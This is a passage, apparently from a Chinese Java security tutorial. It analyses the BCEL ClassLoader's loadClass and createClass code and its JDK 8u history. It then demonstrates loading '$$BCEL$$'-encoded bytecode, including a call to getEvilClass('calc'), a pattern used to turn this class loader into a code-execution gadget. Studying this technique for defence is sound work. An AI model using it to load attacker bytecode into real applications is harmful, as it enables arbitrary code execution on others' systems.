<li><p><strong>2022 年 7 月（8u342）</strong>：老清理项落地：**<a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8132256" >JDK‑8132256<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>** &#x2F; 回移单 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8283529" >JDK‑8283529<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>，把 <strong><code>com.sun.org.apache.bcel.internal.util.ClassPath</code></strong> 这类在 JDK 场景里“基本无效”的代码</strong>移除</strong>（<strong>与 <code>ClassLoader</code> 的删除不是同一改动</strong>）。</p>
</li>
<li><p><strong>2023 年 4 月（8u371 BPR）</strong>：Oracle 的合并版 8u 发行说明列出 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8301269" >JDK‑8301269<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>：</strong>“Update Commons BCEL to Version 6.7.0”</strong>（把内置 BCEL 从 6.5.0 → <strong>6.7.0</strong>）。</p>
<p>因为上游 6.x <strong>一直“保留但废弃”</strong> <code>org.apache.bcel.util.ClassLoader</code>（Javadoc 写明“<strong>Deprecated. 6.0 Do not use – does not work</strong>”），当 JDK 在 <strong>8u371 BPR</strong> 把内置 BCEL 升到 <strong>6.7.0</strong> 后（参见 <strong><a class="link"   target="_blank" rel="noopener" href="https://bugs.openjdk.org/browse/JDK-8301269" >JDK‑8301269<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><strong>），随着 <strong>BPR → 后续 GA 吸纳</strong>，后续版本就</strong>随上游形态把该类“带回来了”</strong>（包名是 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>）。</p>
</li>
</ul>
</blockquote>
<p>BCEL ClassLoader 的 <code>loadClass</code> 实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 按“多级回退”策略动态加载类：缓存 → 系统类 → 特殊标记 → 仓库 → 默认。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;加载顺序简述：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;缓存&lt;/b&gt;：若已加载过（存在于 classes Map），直接返回。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;系统包&lt;/b&gt;：若类名以某些前缀（如 &quot;java.&quot;、&quot;javax.&quot; 等）开头，则交给系统/父加载器处理。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;特殊请求&lt;/b&gt;：若类名包含 &quot;$$BCEL$$&quot;，调用 &#123;<span class="doctag">@link</span> #createClass(String)&#125; 解析构建。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;仓库加载&lt;/b&gt;：否则尝试从 repository（BCEL 的 ClassRepository 或自定义存储）读取并可按需修改。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;兜底&lt;/b&gt;：若以上均失败，尝试 &lt;code&gt;Class.forName&lt;/code&gt; 使用系统机制加载；再失败则抛出异常。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;解析 resolve&lt;/b&gt;：若为 true，则在定义类后调用 &lt;code&gt;resolveClass&lt;/code&gt; 触发链接过程（验证、准备、解析）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;线程安全&lt;/b&gt;：示例中对缓存 Map 的访问未加锁，若在多线程环境中共享 ClassLoader，</span></span><br><span class="line"><span class="comment"> * 建议改用 ConcurrentHashMap 或在关键路径加锁。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> class_name 需要加载的类名；若包含 &quot;$$BCEL$$&quot; 则视为内嵌了编码字节码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> resolve 是否在定义后立即解析（link）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 成功加载并（可选）解析的 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 当无法通过任何途径获取字节码或定义类时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span> </span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 第一层：从本地缓存（classes Map）中查找，避免重复定义与 I/O。 */</span></span><br><span class="line">    <span class="keyword">if</span> ((cl = (Class) classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 第二层：系统类/受忽略包前缀。通常不要干预 JDK/系统类的加载流程。 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 若类名以任一“忽略前缀”开头（如 &quot;java.&quot;, &quot;javax.&quot;, &quot;sun.&quot;, &quot;jdk.&quot; 等）</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">                <span class="comment">// 直接委派给父加载器（deferTo），保持与标准加载行为一致。</span></span><br><span class="line">                cl = deferTo.loadClass(class_name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 第三层：特殊请求（类名中携带 &quot;$$BCEL$$&quot; 标记）。 */</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 解析并构建 BCEL 的 JavaClass（可能返回 null，表示解析失败）</span></span><br><span class="line">                clazz = createClass(class_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* 第四层：尝试通过 repository 读取普通类定义。 */</span></span><br><span class="line">                <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 有机会在定义前注入/修改字节码（如插桩）；由业务方实现 modifyClass(...)</span></span><br><span class="line">                    clazz = modifyClass(clazz);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// repository 中也没有，宣告找不到该类</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 5) 将 JavaClass 物化为原始字节数组（.class 格式）</span></span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.getBytes();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 6) 调用 ClassLoader 的 defineClass(...) 把字节码定义为 JVM 中的类。</span></span><br><span class="line">                <span class="comment">//    注意：该重载未显式传入 ProtectionDomain，默认继承当前 ClassLoader 的域。</span></span><br><span class="line">                <span class="comment">//    若需更细粒度权限控制，建议使用带 ProtectionDomain 的重载。</span></span><br><span class="line">                cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 7) 当 clazz == null（例如 createClass 解析失败）时，尝试走标准反射加载。</span></span><br><span class="line">                <span class="comment">//    这一步通常只在类名本来就是常规形式（无 &quot;$$BCEL$$&quot;）时才有意义。</span></span><br><span class="line">                cl = Class.forName(class_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 8) 根据调用方要求决定是否立即解析（链接）。</span></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9) 记入缓存，后续重复请求可直接复用，避免再定义（重复定义会触发 LinkageError）。</span></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10) 返回最终的 Class 对象。</span></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 基于类名中的特殊标记 &quot;$$BCEL$$&quot; 动态创建 JavaClass。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;工作原理：</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;调用方传入一个包含 &quot;$$BCEL$$&quot; 的字符串（通常形式：&lt;code&gt;任意包路径$$BCEL$$&lt;压缩编码字节码&gt;&lt;/code&gt;）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;标记之前的部分被视为包名，标记之后的部分是通过 BCEL 的 Utility.encode() 之类方法编码过的压缩字节码。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;本方法对标记后的那段字符串执行 &lt;code&gt;Utility.decode(...)&lt;/code&gt; 解码得到原始字节数组，随后用 BCEL 的 &lt;code&gt;ClassParser&lt;/code&gt; 解析为 &lt;code&gt;JavaClass&lt;/code&gt;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;为保证类的“内部名”（constant pool 里的 this_class）与传入的类名一致，这里会直接修改常量池中的 UTF-8 常量。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;安全注意&lt;/b&gt;：从不受信任来源接收的 &lt;code&gt;class_name&lt;/code&gt; 可能导致任意类加载与执行。</span></span><br><span class="line"><span class="comment"> * 请在调用前进行来源校验与权限隔离。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> class_name 包含 &quot;$$BCEL$$&quot; 的压缩字节码字符串（格式：包名 + &quot;$$BCEL$$&quot; + 编码数据）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 解析得到的 JavaClass；若解析失败或发生异常返回 null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 定位特殊标记 &quot;$$BCEL$$&quot; 的位置。</span></span><br><span class="line">    <span class="comment">//    假设调用方已保证一定包含该标记；若存在恶意/脏数据，这里可能返回 -1。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 截取标记之后的内容，作为编码后的“压缩字节码”部分。</span></span><br><span class="line">    <span class="comment">//    例如 &quot;com.acme.MyClass$$BCEL$$&lt;ENCODED&gt;&quot; -&gt; real_name = &quot;&lt;ENCODED&gt;&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 3) 使用 BCEL 的工具类将字符串解码为原始字节数组。</span></span><br><span class="line">        <span class="comment">//    第二个参数 &#x27;true&#x27; 通常表示使用 gzip/zip 之类的“压缩+编码”组合（视 Utility 实现）。</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 将字节数组包装成输入流交给 ClassParser。</span></span><br><span class="line">        <span class="comment">//    第二个参数 &quot;foo&quot; 是一个虚拟的源名（非必须真实文件名），用于错误信息或调试。</span></span><br><span class="line">        <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 解析字节数组，得到 BCEL 的 JavaClass 抽象表示（尚未定义到 JVM）。</span></span><br><span class="line">        clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// 捕获所有 Throwable 以避免 ClassLoader 链路崩溃，但这也可能吞掉严重错误（见建议）。</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  <span class="comment">// 解析失败则返回 null，交由上层逻辑处理。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 为确保“类的内部名”（constant pool 中的 this_class）与外部传入的 class_name 保持一致，</span></span><br><span class="line">    <span class="comment">//    需要修改常量池中的 UTF-8 常量（将内部名更新为用 &#x27;/&#x27; 分隔的内部表示）。</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6.1) 取出指向 this_class 的 ConstantClass 条目。</span></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass) cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                      Constants.CONSTANT_Class);</span><br><span class="line">    <span class="comment">// 6.2) 根据 ConstantClass 的 name_index 再取到真正存放类名字节的 ConstantUtf8。</span></span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8) cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6.3) 替换内部名：Java 字节码中的内部名用 &#x27;/&#x27; 分隔包路径。</span></span><br><span class="line">    <span class="comment">//      例如 &quot;com.acme.Foo&quot; -&gt; &quot;com/acme/Foo&quot;</span></span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 返回解析并完成内部名适配后的 JavaClass。</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从中可以看出 BCEL ClassLoader 加载字节码的过程为：</p>
<ol>
<li><p><strong>查找已加载的类：</strong>首先，系统会通过哈希表 <code>classes</code> 在本地缓存中查找目标类是否已经加载。如果找到了，直接返回已加载的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((cl = (Class) classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果未找到，则继续尝试其他加载方式</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>通过系统类加载器加载类：</strong>如果目标类不在缓存中，系统会使用默认的 <strong>系统类加载器</strong> 来加载类。这是 Java 中常见的类加载方式，适用于类在常规类路径中存在的情况。</p>
<p>这部分的代码通过检查类名是否属于被忽略的包（<code>ignored_packages</code>）来决定是否需要使用默认的类加载器。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);  <span class="comment">// 使用系统类加载器加载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>处理包含 <code>$$BCEL$$</code> 标记的类名：</strong>如果类名包含特殊标记 <code>$$BCEL$$</code>，这意味着该类的字节码是经过特殊编码或压缩的。系统会调用 <code>createClass</code> 方法来解码并生成该类的字节码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    clazz = createClass(class_name);  <span class="comment">// 使用 createClass 方法加载字节码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createClass</code> 解码该类的字节码的具体过程为：</p>
<ol>
<li><strong>查找 <code>$$BCEL$$</code> 标记：</strong>首先，<code>createClass</code> 方法检查类名中是否包含 <code>$$BCEL$$</code> 标记，并从中提取出实际的类名。<ul>
<li><code>class_name.indexOf(&quot;$$BCEL$$&quot;)</code>：查找 <code>$$BCEL$$</code> 的位置。</li>
<li><code>class_name.substring(index + 8)</code>：从 <code>$$BCEL$$</code> 后面开始获取实际的类名部分。</li>
</ul>
</li>
<li><strong>解码字节码：</strong>接下来，<code>real_name</code>（即去掉 <code>$$BCEL$$</code> 后的部分）被传递给 <code>Utility.decode(real_name, true)</code> 方法解码出真正的字节码。<strong>注意这里第二个参数为 <code>true</code>，这意味着字节码在解码后还要进行 GZIP 解压缩。</strong></li>
<li><strong>解析字节码：</strong>解码后的字节数组 <code>bytes</code> 会被传递给 <strong><code>ClassParser</code></strong> 来解析。<code>ClassParser</code> 是 BCEL 提供的一个工具类，用于解析字节数组并生成 <code>JavaClass</code> 对象。<code>JavaClass</code> 对象包含了类的字节码、常量池、方法、字段等信息。</li>
<li><strong>更新类名：</strong>一旦 <code>JavaClass</code> 对象被成功创建，就需要更新类名。<code>JavaClass</code> 对象包含了一个 <strong>常量池（ConstantPool）</strong>，用于存储类的常量信息。<ul>
<li>在常量池中，有一个表示类名的常量（<code>ConstantClass</code>）。通过 <code>getConstant(clazz.getClassNameIndex(), Constants.CONSTANT_Class)</code> 获取类名常量。</li>
<li>然后，我们通过 <code>ConstantUtf8</code> 获取类名的具体字符串表示，并将其替换为传入的完整类名 <code>class_name.replace(&#39;.&#39;, &#39;/&#39;)</code>（将 <code>.</code> 转换为 <code>/</code>）。</li>
<li><code>name.setBytes(class_name.replace(&#39;.&#39;, &#39;/&#39;));</code>：更新常量池中的类名。</li>
</ul>
</li>
<li><strong>返回解析后的 <code>JavaClass</code> 对象：</strong>最后，返回通过 <code>ClassParser</code> 解析后的 <code>JavaClass</code> 对象，它包含了该类的字节码和其他相关信息。</li>
</ol>
</li>
<li><p><strong>定义类并返回：</strong>找到字节码后，<code>defineClass</code> 方法会被调用来将字节码转化为 <code>Class</code> 对象。这个方法会根据字节数组定义一个新的类，最终将其加载到 JVM 中。如果通过 <code>repository</code> 或其他方式加载的类已经存在，系统将跳过定义过程，直接返回 <code>Class</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytes = clazz.getBytes();  <span class="comment">// 获取字节码</span></span><br><span class="line">cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);  <span class="comment">// 定义并加载类</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>缓存类：</strong>最后，加载的类被缓存到 <code>classes</code> 哈希表中，以便下次能够快速访问。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classes.put(class_name, cl);  <span class="comment">// 缓存已加载的类</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>根据上述过程我们可以使用如下代码利用 BCEL ClassLoader 动态加载字节码：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 1. 使用 BCEL 的 Repository 工具加载一个已有的类对象（这里假设有 calc.class）</span></span><br><span class="line">        <span class="comment">//    Repository.lookupClass 会把 Class 对象转为 BCEL 的 JavaClass 表示</span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 把 JavaClass 转换为字节码数组，再用 Utility.encode() 编码成字符串</span></span><br><span class="line">        <span class="comment">//    这个字符串就是 $$BCEL$$ 开头的特殊形式，可以被 BCEL 的 ClassLoader 解析还原为字节码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 用 BCEL 提供的自定义 ClassLoader 来加载类</span></span><br><span class="line">        <span class="comment">//    &quot;$$BCEL$$&quot; + code 的字符串会被识别为一个“内联字节码类”，直接还原并 define 成 Class</span></span><br><span class="line">        <span class="comment">//    注意：这里可以用 Class.forName 也可以用 new ClassLoader().loadClass()</span></span><br><span class="line">        <span class="comment">// Class&lt;?&gt; aClass = Class.forName(&quot;$$BCEL$$&quot; + code, true, new ClassLoader());</span></span><br><span class="line">        Class&lt;?&gt; aClass = <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 实例化这个类（会执行类的构造函数）</span></span><br><span class="line">        aClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先代码使用 <code>Repository.lookupClass(Evil.class)</code> 来查找 <code>Eval</code> 这个类得到 BCEL 管理 Java 类所用的类型 <code>JavaClass</code>，然后通过 <code>javaClass.getBytes()</code> 获取到对应的字节码。这里 <code>Repository</code> 是 BCEL 提供的类，它用于查找和管理 Java 类，并且能够将类转换为原生字节码。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这里只要有要加载的类的字节码即可，因此我们可以按照前面的方法用 <code>javassist</code> 动态生成一个：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(getEvilClass(<span class="string">&quot;calc&quot;</span>), <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>getEvilClass</code> 函数可以动态生成类的字节码：</p>
